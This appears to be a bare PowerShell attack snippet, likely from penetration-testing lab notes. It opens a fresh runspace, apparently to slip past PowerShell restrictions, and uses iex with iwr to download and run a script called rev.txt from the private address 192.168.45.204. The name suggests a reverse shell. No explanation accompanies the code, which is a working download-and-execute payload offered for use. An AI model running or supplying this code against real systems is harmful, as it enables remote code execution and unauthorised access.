$rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
$rs.Open()
$pipe = $rs.CreatePipeline()
$pipe.Commands.AddScript("iex(iwr http://192.168.45.204/rev.txt -UseBasicParsing)")
$pipe.Commands.Add("Out-String")
$pipe.Invoke() | Out-String
$rs.Close()
